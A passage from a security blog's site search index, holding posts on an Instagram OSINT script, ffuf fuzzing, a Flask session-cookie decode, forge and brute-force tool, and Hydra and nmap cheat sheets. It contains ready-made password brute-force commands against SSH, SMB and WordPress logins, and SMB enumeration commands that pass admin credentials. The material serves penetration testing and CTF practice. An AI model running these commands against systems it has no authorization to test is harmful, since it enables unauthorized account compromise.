Cannot bypass Instagram’s rate limits or restrictions. Ethical Use: Only use this tool on accounts you have permission to analyze. Misuse of OSINT tools can lead to legal consequences. Credits Osintagram is inspired by Toutatis by Palenath. Huge thanks to Palenath for blazing the trail in Instagram OSINT tooling.\nFinal Thoughts Osintagram isn’t trying to reinvent the wheel—it’s here to fill the gaps left by older tools that couldn’t keep up with Instagram’s changes. Whether you’re an OSINT enthusiast or a researcher, it’s a reliable companion for extracting and analyzing Instagram profile data.\nGive it a shot, adapt it to your needs, and let me know if you run into issues.\n","permalink":"http://localhost:1313/tools/osintagram/","summary":"\u003cp\u003eGathering OSINT (Open-Source Intelligence) from Instagram used to be straightforward—grab a GitHub tool, run it, and get results. Then Instagram’s API updates broke nearly everything, leaving most tools useless. That’s where \u003cstrong\u003eOsintagram\u003c/strong\u003e comes in: a simple script I put together to finally get Instagram OSINT working again.\u003c/p\u003e\n\u003cp\u003eI’m no developer, just someone frustrated by older tools failing in CTFs and OSINT exercises. Osintagram isn’t perfect, but it’s built to handle the updated systems Instagram uses today. Let me show you how it works and why it might save you some headaches.\u003c/p\u003e","title":"Osintagram"},{"content":"FFUF (Fuzz Faster U Fool) is a fast and flexible web fuzzer that helps penetration testers and security researchers discover directories, files, parameters, and more.\nBasic Syntax ffuf -c -w path/to/wordlist -u https://target_url/FUZZ Examples # Filter responses with a content size of 4242 bytes ffuf -w /path/to/vhost/wordlist -u https://target_url/ -H \u0026#34;Host: FUZZ\u0026#34; -fs 4242 # Filter responses with a 401 status code ffuf -w /path/to/values.txt -u https://target_url/script.php?valid_name=FUZZ -fc 401 # Filter 401 responses and fuzz passwords in a POST request ffuf -w /path/to/postdata.txt -X POST -d \u0026#34;username=admin\\\u0026amp;password=FUZZ\u0026#34; -u https://target_url/login.php -fc 401 Common Flags -c: Enable colorized output. -maxtime: Set the maximum runtime for the process in seconds. -p: Set a delay between requests (e.g., 0.1 seconds). -v: Verbose output. -t: Number of threads (default is 40). -mc: Match specific HTTP status codes (e.g., 200, 301, 403, or all). -fc: Filter out responses by HTTP status codes. -w: Specify the wordlist path. -u: Define the target URL. -s: Enable silent mode. -recursion: Enable recursive fuzzing. -r: Follow redirects. -o: Output results to a file. -of: Specify output format (e.g., json, html, csv, all). -b: Include cookies in the request. Examples # Match all responses, filter 42-byte answers, output colored and verbose ffuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs 42 -c -v # Fuzz host headers and show only status 200 responses ffuf -w hosts.txt -u https://example.org/ -H \u0026#34;Host: FUZZ\u0026#34; -mc 200 # Fuzz the `name` field in a POST request with JSON data, filter responses containing \u0026#34;error\u0026#34; ffuf -w entries.txt -u https://example.org/ -X POST -H \u0026#34;Content-Type: application/json\u0026#34; \\ -d \u0026#39;{\u0026#34;name\u0026#34;: \u0026#34;FUZZ\u0026#34;, \u0026#34;anotherkey\u0026#34;: \u0026#34;anothervalue\u0026#34;}\u0026#39; -fr \u0026#34;error\u0026#34; # Use two wordlists for parameter and value fuzzing, match responses containing \u0026#34;VAL\u0026#34; ffuf -w params.txt:PARAM -w values.txt:VAL -u https://example.org/?PARAM=VAL -mr \u0026#34;VAL\u0026#34; -c Tips and Tricks Interactive Mode: Press Enter while FFUF is running to access interactive features, such as reconfiguring filters or saving the state. Multiple Payloads: Use the FUZZ keyword multiple times in a URL (e.g., https://example.org/path/FUZZ/another_path/FUZZ). Variables in URLs: Specify payload locations using variables (e.g., https://example.org/path/{var1}/another_path/{var2}). ","permalink":"http://localhost:1313/cheat-sheets/ffuf/","summary":"\u003cp\u003e\u003cstrong\u003eFFUF\u003c/strong\u003e (Fuzz Faster U Fool) is a fast and flexible web fuzzer that helps penetration testers and security researchers discover directories, files, parameters, and more.\u003c/p\u003e\n\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -c -w path/to/wordlist -u https://target_url/FUZZ\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"examples\"\u003eExamples\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Filter responses with a content size of 4242 bytes\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w /path/to/vhost/wordlist -u https://target_url/ -H \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Host: FUZZ\u0026#34;\u003c/span\u003e -fs \u003cspan style=\"color:#ae81ff\"\u003e4242\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Filter responses with a 401 status code\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w /path/to/values.txt -u https://target_url/script.php?valid_name\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eFUZZ -fc \u003cspan style=\"color:#ae81ff\"\u003e401\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Filter 401 responses and fuzz passwords in a POST request\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w /path/to/postdata.txt -X POST -d \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;username=admin\\\u0026amp;password=FUZZ\u0026#34;\u003c/span\u003e -u https://target_url/login.php -fc \u003cspan style=\"color:#ae81ff\"\u003e401\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-flags\"\u003eCommon Flags\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-c\u003c/code\u003e\u003c/strong\u003e: Enable colorized output.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-maxtime\u003c/code\u003e\u003c/strong\u003e: Set the maximum runtime for the process in seconds.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p\u003c/code\u003e\u003c/strong\u003e: Set a delay between requests (e.g., \u003ccode\u003e0.1\u003c/code\u003e seconds).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-v\u003c/code\u003e\u003c/strong\u003e: Verbose output.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-t\u003c/code\u003e\u003c/strong\u003e: Number of threads (default is 40).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-mc\u003c/code\u003e\u003c/strong\u003e: Match specific HTTP status codes (e.g., \u003ccode\u003e200\u003c/code\u003e, \u003ccode\u003e301\u003c/code\u003e, \u003ccode\u003e403\u003c/code\u003e, or \u003ccode\u003eall\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-fc\u003c/code\u003e\u003c/strong\u003e: Filter out responses by HTTP status codes.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-w\u003c/code\u003e\u003c/strong\u003e: Specify the wordlist path.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-u\u003c/code\u003e\u003c/strong\u003e: Define the target URL.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-s\u003c/code\u003e\u003c/strong\u003e: Enable silent mode.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-recursion\u003c/code\u003e\u003c/strong\u003e: Enable recursive fuzzing.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-r\u003c/code\u003e\u003c/strong\u003e: Follow redirects.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-o\u003c/code\u003e\u003c/strong\u003e: Output results to a file.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-of\u003c/code\u003e\u003c/strong\u003e: Specify output format (e.g., \u003ccode\u003ejson\u003c/code\u003e, \u003ccode\u003ehtml\u003c/code\u003e, \u003ccode\u003ecsv\u003c/code\u003e, \u003ccode\u003eall\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-b\u003c/code\u003e\u003c/strong\u003e: Include cookies in the request.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"examples-1\"\u003eExamples\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Match all responses, filter 42-byte answers, output colored and verbose\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs \u003cspan style=\"color:#ae81ff\"\u003e42\u003c/span\u003e -c -v\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Fuzz host headers and show only status 200 responses\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w hosts.txt -u https://example.org/ -H \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Host: FUZZ\u0026#34;\u003c/span\u003e -mc \u003cspan style=\"color:#ae81ff\"\u003e200\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Fuzz the `name` field in a POST request with JSON data, filter responses containing \u0026#34;error\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w entries.txt -u https://example.org/ -X POST -H \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Content-Type: application/json\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e-d \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{\u0026#34;name\u0026#34;: \u0026#34;FUZZ\u0026#34;, \u0026#34;anotherkey\u0026#34;: \u0026#34;anothervalue\u0026#34;}\u0026#39;\u003c/span\u003e -fr \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;error\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Use two wordlists for parameter and value fuzzing, match responses containing \u0026#34;VAL\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w params.txt:PARAM -w values.txt:VAL -u https://example.org/?PARAM\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eVAL -mr \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;VAL\u0026#34;\u003c/span\u003e -c\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"tips-and-tricks\"\u003eTips and Tricks\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eInteractive Mode\u003c/strong\u003e: Press \u003ccode\u003eEnter\u003c/code\u003e while FFUF is running to access interactive features, such as reconfiguring filters or saving the state.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMultiple Payloads\u003c/strong\u003e: Use the \u003ccode\u003eFUZZ\u003c/code\u003e keyword multiple times in a URL (e.g., \u003ccode\u003ehttps://example.org/path/FUZZ/another_path/FUZZ\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVariables in URLs\u003c/strong\u003e: Specify payload locations using variables (e.g., \u003ccode\u003ehttps://example.org/path/{var1}/another_path/{var2}\u003c/code\u003e).\u003c/li\u003e\n\u003c/ul\u003e","title":"ffuf"},{"content":"Flask web applications are clever beasts, storing session data client-side in cookies. It’s convenient for developers, but it can also be a security rabbit hole if you’re not careful. That’s why I put together FlaskOfCookies, a tool to help you decode, encode, and (if necessary) brute-force Flask session cookies.\nTo be clear, this isn’t entirely my invention. It started because I hit a wall on a Root-Me challenge, I couldn’t get it done with noraj’s tool (props to Alexandre Zanni for his great work). So, I decided to rework it, adding my own spin to tackle the issue. This tool is for anyone who’s curious about Flask’s session cookies, whether you’re debugging, testing, or just poking around.\nWhy Session Cookies Matter Session cookies in Flask encode data into a compact, URL-safe string. They’re handy for keeping track of users or passing small pieces of data between the client and server. But they also mean your data sits in plain sight. If you’re not careful with what you store—or if your secret key isn’t strong—those cookies can tell stories you’d rather keep quiet.\nWhat Does FlaskOfCookies Do? Decoding Cookies FlaskOfCookies can crack open a Flask session cookie and show you the contents. If you have the secret key, it’ll reconstruct the original session data. Without the key, it’ll still give you a peek at the encoded structure. This is helpful for:\nChecking if sensitive information is leaking. Testing whether session data is being properly secured. Encoding Cookies Need to create a Flask-compatible session cookie? FlaskOfCookies takes a Python dictionary and a secret key as input and spits out a session cookie. This is handy if you’re:\nDebugging session handling in your app. Seeing how different data structures get encoded. Brute-Forcing Secret Keys If you don’t know the secret key, FlaskOfCookies can try to guess it for you. Just supply a wordlist, and the tool will hammer away until it finds a match (or gives up). This isn’t a feature for cracking into random apps; it’s a wake-up call to use strong, random keys. If you’re using “password123” for your Flask secret, consider yourself warned.\nHow It Works FlaskOfCookies is built on Flask’s session-handling mechanisms and the itsdangerous library, which Flask uses under the hood. It aligns with Flask’s default behavior, including the cookie-session salt, to make sure the results match what Flask itself would produce.\nHere’s the general flow:\nDecoding: The tool parses the encoded cookie value, optionally verifying it against a provided secret key. Encoding: It serializes a Python dictionary into a session cookie using Flask-compatible methods. Brute-Forcing: Tries every key in your wordlist to find the one that correctly decodes the cookie. It’s straightforward, with clear error messages and input validation to keep things manageable.\nWhy Use FlaskOfCookies? Honestly, this is more of a “because I had to” kind of tool. After struggling with the Root-Me challenge and realizing noraj’s tool wasn’t working for me, I figured I’d make something myself. FlaskOfCookies won’t win awards, but it’s lightweight, easy to use, and gives you insight into how Flask manages session cookies. Whether you’re a Flask developer or a security researcher, it can help you:\nLearn how session cookies work. Test your app for key management flaws. Debug session-related bugs. Getting Started with FlaskOfCookies First, make sure you have Python 3.x installed. You’ll also need Flask and itsdangerous:\npip install Flask itsdangerous Then, grab FlaskOfCookies from the repository:\ngit clone https://github.com/noobosaurus-r3x/FlaskOfCookies cd FlaskOfCookies Alternatively, you can download the FOC.py script directly.\nWhat You Can Do With It Here’s a quick guide to the tool’s commands:\nDecode a Session Cookie If you know the secret key:\npython3 FOC.py decode -s \u0026#39;\u0026lt;secret_key\u0026gt;\u0026#39; -c \u0026#39;\u0026lt;cookie_value\u0026gt;\u0026#39; Without the key, you can still see the structure:\npython3 FOC.py decode -c \u0026#39;\u0026lt;cookie_value\u0026gt;\u0026#39; Encode a Session Cookie To create a new session cookie:\npython3 FOC.py encode -s \u0026#39;\u0026lt;secret_key\u0026gt;\u0026#39; -t \u0026#34;{\u0026#39;username\u0026#39;:\u0026#39;admin\u0026#39;,\u0026#39;role\u0026#39;:\u0026#39;superuser\u0026#39;}\u0026#34; Brute-Force the Secret Key To test key strength with a wordlist:\npython3 FOC.py bruteforce -c \u0026#39;\u0026lt;cookie_value\u0026gt;\u0026#39; -w \u0026#39;\u0026lt;path_to_wordlist\u0026gt;\u0026#39; Final Thoughts FlaskOfCookies isn’t groundbreaking, but it’s a practical little tool for anyone exploring Flask session cookies. Whether you’re trying to figure out how they work, testing your app’s security, or debugging a frustrating challenge, it’ll save you some time.\nRemember, this started as a personal project to solve a specific problem, so don’t expect perfection. That said, I hope it’s useful—and if you think of ways to improve it, feel free to fork the repo and go wild. You can find it here.\n","permalink":"http://localhost:1313/tools/flask_of_cookies/","summary":"\u003cp\u003eFlask web applications are clever beasts, storing session data client-side in cookies. It’s convenient for developers, but it can also be a security rabbit hole if you’re not careful. That’s why I put together \u003cstrong\u003eFlaskOfCookies\u003c/strong\u003e, a tool to help you decode, encode, and (if necessary) brute-force Flask session cookies.\u003c/p\u003e\n\u003cp\u003eTo be clear, this isn’t entirely my invention. It started because I hit a wall on a \u003cstrong\u003eRoot-Me challenge\u003c/strong\u003e, I couldn’t get it done with \u003cstrong\u003enoraj’s tool\u003c/strong\u003e (props to Alexandre Zanni for his great work). So, I decided to rework it, adding my own spin to tackle the issue. This tool is for anyone who’s curious about Flask’s session cookies, whether you’re debugging, testing, or just poking around.\u003c/p\u003e","title":"FlaskOfCookies"},{"content":"Hydra is a powerful and flexible password-cracking tool designed for brute-forcing authentication protocols. It supports a wide range of protocols and is highly configurable for various use cases.\nBasic Syntax hydra [options] \u0026lt;IP\u0026gt; \u0026lt;protocol\u0026gt; Common Flags -h: Display the help menu. -l \u0026lt;username\u0026gt;: Specify a single username/login. -L \u0026lt;wordlist\u0026gt;: Use a wordlist for usernames/logins. -p \u0026lt;password\u0026gt;: Specify a single password. -P \u0026lt;wordlist\u0026gt;: Use a wordlist for passwords. -s \u0026lt;PORT\u0026gt;: Specify the target port. -f: Stop brute-forcing after finding valid credentials. -R: Restore a previous session. -t \u0026lt;number\u0026gt;: Set the number of threads to use. -V: Enable verbose mode. Supported Protocols Hydra supports numerous protocols, including:\nSSH FTP POP3 HTTP-FORM-GET HTTP-FORM-POST HTTP-HEAD HTTP-POST HTTP-GET IMAP SMB SMTP MySQL For the full list, refer to Hydra\u0026rsquo;s help menu (hydra -h).\nExamples SSH Brute-Force Attack hydra -l admin -P rockyou.txt 192.168.10.10 ssh SSH with Multiple Usernames hydra -L top-usernames-shortlist.txt -P rockyou.txt 192.168.10.10 ssh SMB Brute-Force Attack hydra -L top-usernames-shortlist.txt -P rockyou.txt 192.168.10.10 smb Brute-Forcing HTTP POST Forms Hydra can handle custom HTTP POST forms:\nhydra -l admin -P rockyou.txt 192.168.10.10 http-post-form \\ \u0026#34;/login:username=admin\u0026amp;password=^PASS^:F=Your password is incorrect\u0026#34; Wordpress Login Brute-Force Hydra can target WordPress login forms with custom parameters:\nhydra -l admin -P rockyou.txt 192.168.10.10 -V http-form-post \\ \u0026#34;/wp-login.php:log=admin\u0026amp;pwd=^PASS^\u0026amp;wp-submit=Log In\u0026amp;testcookie=1:S=Location\u0026#34; Tips and Tricks Session Management: Use -R to restore interrupted sessions without starting over. Efficiency: Adjust the number of threads with -t to balance speed and server load. Verbose Mode: Use -V to see each login attempt in real-time, useful for troubleshooting. Custom Form Parameters: Understand the target login form structure to craft precise Hydra commands. Final Thoughts Hydra is an essential tool in the arsenal of penetration testers and security professionals. While powerful, it must be used responsibly and only with proper authorization. Keep this cheat sheet handy to efficiently navigate Hydra\u0026rsquo;s capabilities and tailor it to your testing needs.\n\u0026ndash;\n","permalink":"http://localhost:1313/cheat-sheets/hydra/","summary":"\u003cp\u003e\u003cstrong\u003eHydra\u003c/strong\u003e is a powerful and flexible password-cracking tool designed for brute-forcing authentication protocols. It supports a wide range of protocols and is highly configurable for various use cases.\u003c/p\u003e\n\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ehydra \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eoptions\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e \u0026lt;IP\u0026gt; \u0026lt;protocol\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-flags\"\u003eCommon Flags\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-h\u003c/code\u003e\u003c/strong\u003e: Display the help menu.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-l \u0026lt;username\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify a single username/login.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-L \u0026lt;wordlist\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Use a wordlist for usernames/logins.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;password\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify a single password.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-P \u0026lt;wordlist\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Use a wordlist for passwords.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-s \u0026lt;PORT\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the target port.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-f\u003c/code\u003e\u003c/strong\u003e: Stop brute-forcing after finding valid credentials.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-R\u003c/code\u003e\u003c/strong\u003e: Restore a previous session.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-t \u0026lt;number\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Set the number of threads to use.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-V\u003c/code\u003e\u003c/strong\u003e: Enable verbose mode.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"supported-protocols\"\u003eSupported Protocols\u003c/h2\u003e\n\u003cp\u003eHydra supports numerous protocols, including:\u003c/p\u003e","title":"Hydra"},{"content":"Basic Syntax nmap \u0026lt;target IP\u0026gt; nmap -sT -sS -Pn -v 10.10.10.10 sudo nmap -A -sS -Pn 10.10.10.10 sudo nmap -sV -sT -O -p- -vv --script vulners 10.10.10.10 Common Flags Scan Types -sT: Perform a TCP connect scan. -sU: Perform a UDP scan. -sS: Perform a SYN scan (\u0026ldquo;Stealth Scan\u0026rdquo;). -Pn: Skip pinging the target. -sn: Host discovery without scanning ports. -A: Enable aggressive scan options. Advanced Features -p \u0026lt;PORT\u0026gt;: Scan specific ports. -p-: Scan all 65,535 ports. -sV: Detect services and versions running on the target. -O: Detect the operating system. -v****, -vv, ********-vvv: Set verbosity levels. --script vuln: Run vulnerability scripts. --script vulners: Use vulners scripts for CVE-based scanning. --script=http-enum: Act like Nikto to enumerate HTTP resources. Output Formats -oN: Normal text output, best for human-readable logs during manual reviews. -oX: XML output, ideal for automated tools or integrations that require structured data. ``: Greppable output, useful for scripting and quickly filtering resulst with tools like grep. -oA: Generate all three formats at once, providing maximum flexibility for further analysis or reporting. SMB Scripts Enumerate Security Mode nmap -p445 --script smb-security-mode 192.168.1.1 Enumerate Sessions nmap -p445 --script smb-enum-sessions 192.168.1.1 nmap -p445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Shares nmap -p445 --script smb-enum-shares 192.168.1.1 nmap -p445 --script smb-enum-shares --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Shares with Listing Listing shares and their contents can reveal valuable information about a system, such as misconfigured permissions or sensitive files stored in shared directories. This is especially important during audits or penetration tests to identify potential security gaps.\nnmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Users nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Stats nmap -p445 --script smb-enum-stats --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Domains nmap -p445 --script smb-enum-domains --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Groups nmap -p445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=password 192.168.1.1 SSH Scripts Enumerate Algorithms nmap 192.168.1.1 -p 22 --script ssh2-enum-algos Enumerate Host Keys nmap 192.168.1.1 -p 22 --script ssh-hostkey --script-args ssh_hostkey=full Enumerate Authentication Methods nmap 192.168.1.1 -p 22 --script ssh-auth-methods --script-args=\u0026#34;ssh.user=admin\u0026#34; ","permalink":"http://localhost:1313/cheat-sheets/nmap/","summary":"\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap \u0026lt;target IP\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -sT -sS -Pn -v 10.10.10.10\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo nmap -A -sS -Pn 10.10.10.10\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo nmap -sV -sT -O -p- -vv --script vulners 10.10.10.10\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-flags\"\u003eCommon Flags\u003c/h2\u003e\n\u003ch3 id=\"scan-types\"\u003eScan Types\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sT\u003c/code\u003e\u003c/strong\u003e: Perform a TCP connect scan.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sU\u003c/code\u003e\u003c/strong\u003e: Perform a UDP scan.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sS\u003c/code\u003e\u003c/strong\u003e: Perform a SYN scan (\u0026ldquo;Stealth Scan\u0026rdquo;).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-Pn\u003c/code\u003e\u003c/strong\u003e: Skip pinging the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sn\u003c/code\u003e\u003c/strong\u003e: Host discovery without scanning ports.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-A\u003c/code\u003e\u003c/strong\u003e: Enable aggressive scan options.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"advanced-features\"\u003eAdvanced Features\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;PORT\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Scan specific ports.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p-\u003c/code\u003e\u003c/strong\u003e: Scan all 65,535 ports.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sV\u003c/code\u003e\u003c/strong\u003e: Detect services and versions running on the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-O\u003c/code\u003e\u003c/strong\u003e: Detect the operating system.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-v\u003c/code\u003e\u003c/strong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e****, 